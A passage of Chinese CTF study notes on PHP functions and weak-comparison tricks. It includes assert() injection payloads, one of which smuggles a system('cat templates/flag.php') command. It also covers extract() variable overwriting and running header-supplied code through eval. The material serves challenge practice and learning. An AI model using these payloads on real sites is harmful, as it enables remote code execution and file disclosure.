<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>系统会在 <code>/home/rceservice/jail</code> 目录下查找 <code>ls</code> 命令。</li>
<li>如果 <code>/home/rceservice/jail/ls</code> 存在，就会执行该文件；否则，会报错。</li>
</ul>
<h4 id="pahinfo"><a href="#pahinfo" class="headerlink" title="pahinfo()"></a>pahinfo()</h4><p>将传入的路径“字典化”</p>
<p><strong>var_dump(pathinfo(‘sandox/cfbb870b58817bf7705c0bd826e8dba7/123’));</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">array(3) &#123;</span><br><span class="line">  [&quot;dirname&quot;]=&gt;</span><br><span class="line">  string(39) &quot;sandox/cfbb870b58817bf7705c0bd826e8dba7&quot;</span><br><span class="line">  [&quot;basename&quot;]=&gt;</span><br><span class="line">  string(3) &quot;123&quot;</span><br><span class="line">  [&quot;filename&quot;]=&gt;</span><br><span class="line">  string(3) &quot;123&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>var_dump(pathinfo(‘sandox/cfbb870b58817bf7705c0bd826e8dba7/123.txt’));</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">array(4) &#123;</span><br><span class="line">  [&quot;dirname&quot;]=&gt;</span><br><span class="line">  string(39) &quot;sandox/cfbb870b58817bf7705c0bd826e8dba7&quot;</span><br><span class="line">  [&quot;basename&quot;]=&gt;</span><br><span class="line">  string(7) &quot;123.txt&quot;</span><br><span class="line">  [&quot;extension&quot;]=&gt;</span><br><span class="line">  string(3) &quot;txt&quot;</span><br><span class="line">  [&quot;filename&quot;]=&gt;</span><br><span class="line">  string(3) &quot;123&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents()"></a>file_put_contents()</h4><p>将结果放进文件中</p>
<h4 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes()"></a>addslashes()</h4><p><code>addslashes</code>是PHP中的一个字符串处理函数，用于在字符串中的某些特定字符前添加反斜杠（<code>\</code>），以确保这些字符在后续的处理过程中不会引起语法错误或安全问题。这些特定字符包括单引号（<code>&#39;</code>）、双引号（<code>&quot;</code>）、反斜杠（<code>\</code>）和NULL字节。</p>
<p><strong>功能说明</strong></p>
<ul>
<li><strong>作用</strong>：在字符串中的单引号（<code>&#39;</code>）、双引号（<code>&quot;</code>）、反斜杠（<code>\</code>）和NULL字节前添加反斜杠。</li>
<li><strong>目的</strong>：防止这些字符在SQL查询、字符串拼接等操作中引起语法错误或安全问题（如SQL注入）。</li>
<li><strong>返回值</strong>：返回处理后的字符串。</li>
</ul>
<p><strong>使用示例</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;Hello &#x27;World&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$escaped_str</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$escaped_str</span>; <span class="comment">// 输出：Hello \&#x27;World\&#x27;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="extract"><a href="#extract" class="headerlink" title="extract()"></a>extract()</h4><p>用于从数组中提取元素并将它们导入到当前的符号表中，即将数组的键名作为变量名，键值作为变量值。</p>
<p>很可能会覆盖变量！！！</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>当我们传入SESSION[flag]=123时，$SESSION[“user”]和$SESSION[‘function’] 全部会消失</p>
<h4 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h4><ol>
<li><strong>基本概念</strong><ul>
<li><code>assert()</code> 函数是 PHP 中用于断言的内置函数。断言是一种编程概念，它允许程序员在程序代码中放置检查点，以验证程序的状态是否符合预期。在 PHP 中，这个函数默认是启用的，它可以帮助开发者在开发和调试过程中快速发现程序中的逻辑错误。</li>
<li><code>assert()</code>函数会将读入的代码当作php执行</li>
</ul>
</li>
</ol>
<p>E.g</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>先将strpos闭合，然后将后面的语句<code>&#39;..&#39;)===false&quot;) or die (&quot;Detected hacking attempt!&quot;)</code>注释掉</p>
<p>然后构造payload：<code>?page=&#39;.phpinfo();//</code></p>
<p><code>&#39;).system(&quot;cat templates/flag.php&quot;);//</code></p>
<p>变为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;templates/&#x27;).system(&quot;</span>cat templates/flag.php<span class="string">&quot;);//.php&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);)</span><br></pre></td></tr></table></figure>
<p>只留下:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;templates/&#x27;).system(&quot;</span>cat templates/flag.php<span class="string">&quot;);</span></span><br></pre></td></tr></table></figure>
<h4 id="uniqid"><a href="#uniqid" class="headerlink" title="uniqid()"></a>uniqid()</h4><p><code>uniqid()</code> 是 PHP 中的一个函数，用于生成一个唯一的 ID，通常用于创建唯一的标识符，例如文件名、临时标识符等。它基于当前时间戳生成，具有较高的唯一性，但并不是绝对的全球唯一。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 基本用法</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">uniqid</span>(); <span class="comment">// 输出类似: 55c31b2d67f66</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 带前缀</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">uniqid</span>(<span class="string">&#x27;prefix_&#x27;</span>); <span class="comment">// 输出类似: prefix_55c31b2d67f66</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加额外熵</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">uniqid</span>(<span class="string">&#x27;&#x27;</span>, <span class="literal">true</span>); <span class="comment">// 输出类似: 55c31b2d7e5e25.43184718</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="date"><a href="#date" class="headerlink" title="date()"></a>date()</h4><p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/4096">[CISCN 2023 华北]ez_date | NSSCTF</a></p>
<p>PHP 中的 <code>date()</code> 函数是一个非常重要的日期和时间处理函数，它能够格式化一个时间戳为更易读的日期和时间形式</p>
<p><strong>常用格式化参数</strong></p>
<ul>
<li><code>d</code>：表示一个月中的第几天，两位数字，如果是一天则前面补零，如 <code>01</code> 到 <code>31</code>。</li>
<li><code>m</code>：表示一年中的第几个月，两位数字，如 <code>01</code> 到 <code>12</code>。</li>
<li><code>Y</code>：四位数字完整表示年份，如 <code>2023</code>。</li>
<li><code>H</code>：表示小时，24 小时制，两位数字，如 <code>00</code> 到 <code>23</code>。</li>
<li><code>i</code>：表示分，两位数字，如 <code>00</code> 到 <code>59</code>。</li>
<li><code>s</code>：表示秒，两位数字，如 <code>00</code> 到 <code>59</code>。</li>
<li><code>a</code>：表示 AM 或 PM（上午或下午）。</li>
<li><code>l</code>:（小写的 L）：完整的星期几的文本名称，如 <code>Monday</code>。</li>
<li><code>M</code>：三个字母缩写的月份名称，如 <code>Jan</code>。</li>
<li><code>g</code> :用于获取小时部分，范围是从 1 到 12。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 基本用法，获取当前日期和时间</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">date</span>(<span class="string">&quot;Y-m-d H:i:s&quot;</span>); <span class="comment">// 输出类似: 2023-10-05 15:30:45</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 格式化特定时间戳</span></span><br><span class="line"><span class="variable">$timestamp</span> = <span class="title function_ invoke__">strtotime</span>(<span class="string">&quot;2023-10-01 12:00:00&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">date</span>(<span class="string">&quot;l, F j, Y, g:i A&quot;</span>, <span class="variable">$timestamp</span>); <span class="comment">// 输出: Sunday, October 1, 2023, 12:00 PM</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取当前的日期和时间中星期几的名称</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">date</span>(<span class="string">&quot;l&quot;</span>); <span class="comment">// 输出类似: Friday</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="stream-context-create"><a href="#stream-context-create" class="headerlink" title="@stream_context_create()"></a>@stream_context_create()</h4><p><code>stream_context_create</code> 是 PHP 中用于创建一个流（stream）上下文的函数。流上下文是为文件流（比如网络请求）配置选项的一个集合，它可以让开发者对流的行为进行自定义，比如设置请求头、超时时间、用户认证等。</p>
<p><strong>语法</strong></p>
<ul>
<li><code>resource stream_context_create ( array $options [, array $params ] )</code></li>
<li>参数 <code>options</code> 是一个关联数组，用于指定不同协议（如 HTTP、FTP 等）的上下文选项，默认值为 NULL。例如，对于 HTTP 请求，可以设置 <code>header</code> 选项来添加请求头信息。</li>
<li>参数 <code>params</code> 是一个关联数组，用于指定上下文的参数，如通知回调函数等，默认值为 NULL。</li>
</ul>
<p><strong>使用示例</strong></p>
<ul>
<li>创建一个 HTTP 请求上下文，设置用户代理和请求头：</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$options</span> = [</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span> =&gt; [</span><br><span class="line">        <span class="string">&#x27;method&#x27;</span> =&gt; <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;header&#x27;</span> =&gt; <span class="string">&quot;User-Agent: PHP\r\n&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;timeout&#x27;</span> =&gt; <span class="number">30</span></span><br><span class="line">    ]</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="variable">$context</span> = <span class="title function_ invoke__">stream_context_create</span>(<span class="variable">$options</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用上下文打开网页并获取内容</span></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;https://www.example.com&#x27;</span>, <span class="literal">false</span>, <span class="variable">$context</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>在这个例子中，<code>stream_context_create</code> 创建了一个用于 HTTP 协议的上下文，设置了请求方法为 <code>GET</code>、添加了用户代理头，并设置了超时时间为 30 秒。然后使用 <code>file_get_contents</code> 函数和这个上下文来获取网页的内容。</li>
</ul>
<h4 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a>strcmp()</h4><p><code>strcmp</code> 是一个用于比较两个字符串的函数。</p>
<ol>
<li><strong>函数原型</strong><ul>
<li><code>int strcmp ( string $str1 , string $str2 )</code></li>
</ul>
</li>
<li><strong>参数</strong><ul>
<li><code>$str1</code>：第一个要比较的字符串。</li>
<li><code>$str2</code>：第二个要比较的字符串。</li>
</ul>
</li>
<li><strong>返回值</strong><ul>
<li>如果返回值小于 0，表示 <code>$str1</code> 小于 <code>$str2</code>。</li>
<li>如果返回值等于 0，表示 <code>$str1</code> 和 <code>$str2</code> 相等。</li>
<li>如果返回值大于 0，表示 <code>$str1</code> 大于 <code>$str2</code></li>
</ul>
</li>
</ol>
<h4 id="extract-1"><a href="#extract-1" class="headerlink" title="extract()"></a>extract()</h4><p><code>extract()</code> 是 PHP 中一个用于从数组中将变量导入到当前符号表的函数。它主要用来方便地将数组中的键值对转换为单独的变量。下面详细介绍其使用方法、参数以及注意事项：</p>
<p><strong>函数定义</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">extract</span> ( <span class="keyword">array</span> <span class="variable">$array</span> [, <span class="keyword">int</span> <span class="variable">$extract_type</span> = EXTR_OVERWRITE [, <span class="keyword">string</span> <span class="variable">$prefix</span> ]] )</span><br></pre></td></tr></table></figure>
<p><strong>参数详解</strong></p>
<ul>
<li><strong><code>$array</code></strong> ：必需。要从其中提取变量的数组。</li>
<li><strong><code>$extract_type</code></strong> ：可选。用于指定冲突时的处理方式，默认值为 <code>EXTR_OVERWRITE</code>。常见的可选值有：<ul>
<li><code>EXTR_OVERWRITE</code> ：如果有冲突，覆盖已存在的变量。</li>
<li><code>EXTR_SKIP</code> ：如果有冲突，不覆盖已存在的变量。</li>
<li><code>EXTR_PREFIX_SAME</code> ：如果有冲突，则给变量添加前缀。</li>
<li><code>EXTR_PREFIX_ALL</code> ：给所有变量添加前缀。</li>
<li><code>EXTR_PREFIX_INVALID</code> ：仅给无效的或数字的变量名添加前缀。</li>
</ul>
</li>
<li><strong><code>$prefix</code></strong> ：可选。如果指定了前缀类型，需要提供一个前缀。前缀用于区分变量名，避免冲突。</li>
</ul>
<p><strong>返回值</strong></p>
<p>该函数返回成功提取的变量数目。</p>
<p><strong>使用示例</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data</span> = [<span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;Alice&#x27;</span>, <span class="string">&#x27;age&#x27;</span> =&gt; <span class="number">30</span>];</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>; <span class="comment">// 输出：Alice</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$age</span>; <span class="comment">// 输出：30</span></span><br></pre></td></tr></table></figure>
<p><strong>注意事项</strong></p>
<ul>
<li><strong>变量覆盖风险</strong> ：使用 <code>extract()</code> 时需要特别小心，因为它可能导致变量覆盖问题。如果从外部输入（如用户输入）构造的数组中提取变量，可能会无意中覆盖重要的变量，从而引发意外行为或安全漏洞。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 假设有一个数组，其内容可能来自外部输入（如用户提交的表单数据）</span><br><span class="line">$user_input = array(&quot;user_id&quot; =&gt; &quot;123&quot;, &quot;role&quot; =&gt; &quot;admin&quot;);</span><br><span class="line"></span><br><span class="line">// 现变量有的</span><br><span class="line">$user_id = &quot;456&quot;;</span><br><span class="line">$role = &quot;user&quot;;</span><br><span class="line"></span><br><span class="line">// 使用 extract() 函数提取数组中的变量</span><br><span class="line">extract($user_input);</span><br><span class="line"></span><br><span class="line">// 输出结果，查看变量是否被覆盖</span><br><span class="line">echo &quot;User ID: &quot; . $user_id . &quot;\n&quot;;</span><br><span class="line">echo &quot;Role: &quot; . $role . &quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">// 如果 $user_input 数组来自不可信的外部输入，这就可能导致严重的安全问题</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//User ID: 123 Role: admin</span><br></pre></td></tr></table></figure>
<h4 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a>getallheaders()</h4><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[NewStarCTF 2023 公开赛道]R!!C!!E!!">BUUCTF在线评测</a></p>
<p>使用 <code>getallheaders()</code> 获取当前请求的所有 HTTP 标头，并返回一个数组</p>
<h4 id="pos"><a href="#pos" class="headerlink" title="pos()"></a>pos()</h4><p><code>pos()</code> 函数是 PHP 中的一个内置函数，用于返回数组中当前元素的值。它是 <code>current()</code> 函数的别名，二者功能完全相同</p>
<p><strong>参数</strong></p>
<ul>
<li><code>$array</code>：必需，指定要操作的数组。</li>
</ul>
<p><strong>返回值</strong></p>
<p>返回数组中当前指针所指向的元素的值。如果指针超出了数组的范围，则返回 <code>false</code>。</p>
<p><strong>使用示例</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$array</span> = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">pos</span>(<span class="variable">$array</span>); <span class="comment">// 输出 1，因为指针最初指向第一个元素</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">next</span>(<span class="variable">$array</span>); <span class="comment">// 移动指针到下一个元素</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">pos</span>(<span class="variable">$array</span>); <span class="comment">// 输出 2</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">next</span>(<span class="variable">$array</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">pos</span>(<span class="variable">$array</span>); <span class="comment">// 输出 3</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="array-reverse"><a href="#array-reverse" class="headerlink" title="array_reverse()"></a>array_reverse()</h4><p>这个函数用于反转数组的顺序。它接收一个数组作为参数，并返回一个新的数组，其元素顺序与原数组相反</p>
<p>可以结合pos()和eval()使用，比如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Host: example.com</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Accept: text/html</span><br><span class="line">X-Custom-Header: &lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>
<ol>
<li><p><code>getallheaders()</code> 返回的数组是：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span> =&gt; <span class="string">&#x27;example.com&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span> =&gt; <span class="string">&#x27;Mozilla/5.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span> =&gt; <span class="string">&#x27;text/html&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X-Custom-Header&#x27;</span> =&gt; <span class="string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>array_reverse()</code> 反转后的数组是：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    <span class="string">&#x27;X-Custom-Header&#x27;</span> =&gt; <span class="string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span> =&gt; <span class="string">&#x27;text/html&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span> =&gt; <span class="string">&#x27;Mozilla/5.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span> =&gt; <span class="string">&#x27;example.com&#x27;</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>pos()</code> 获取反转后数组的第一个元素，即 <code>&#39;&lt;?php phpinfo(); ?&gt;&#39;</code>。</p>
</li>
<li><p><code>eval()</code> 尝试执行这个字符串作为 PHP 代码。如果字符串是有效的 PHP 代码，它会被执行。</p>
</li>
</ol>
<h4 id="highlight-file"><a href="#highlight-file" class="headerlink" title="highlight_file()"></a>highlight_file()</h4><p><code>highlight_file</code>用于将一个文件的内容作为HTML语法高亮显示。它会显示文件的源代码，其中每个元素使用HTML标记进行语法高亮</p>
<h3 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Mrsm1th/p/6745532.html">php 弱类型总结 - Mrsm1th - 博客园</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/linfangnan/p/13411103.html">CTF-WEB：PHP 弱类型 - 乌漆WhiteMoon - 博客园</a></p>
<p>php中有两种比较</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a == b</span><br><span class="line">a === b</span><br></pre></td></tr></table></figure>
<p>两个等于在比较的时候，会将字符串类型转化成相同的再比较</p>
<p>比如:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = 123</span><br><span class="line">b = &#x27;123a&#x27;</span><br></pre></td></tr></table></figure>
<p>这两个其实是相等的，这在绕过检测中是非常重要的</p>
<p>比如让判断 <strong>a == 123</strong>，但又规定a不允许为数字，就可以利用弱比较来绕过</p>
<p>还有一些：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;admin&quot;</span>==<span class="number">0</span>);  <span class="comment">//true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;1admin&quot;</span>==<span class="number">1</span>); <span class="comment">//true 因为直接转化成1</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;admin1&quot;</span>==<span class="number">1</span>) <span class="comment">//false</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;admin1&quot;</span>==<span class="number">0</span>) <span class="comment">//true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;0e123456&quot;</span>==<span class="string">&quot;0e4456789&quot;</span>); <span class="comment">//true </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//&quot;0e123456&quot;==&quot;0e456789&quot;相互比较的时候，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等</span></span><br></pre></td></tr></table></figure>
<p>对于数字这一块，如果要求 <strong>a &gt; 10000</strong>，但是又要求a不能超过四位数，就可以用科学计数法来绕过</p>
<p>比如给个 a = 1e6就可以了</p>
<p>例题：</p>
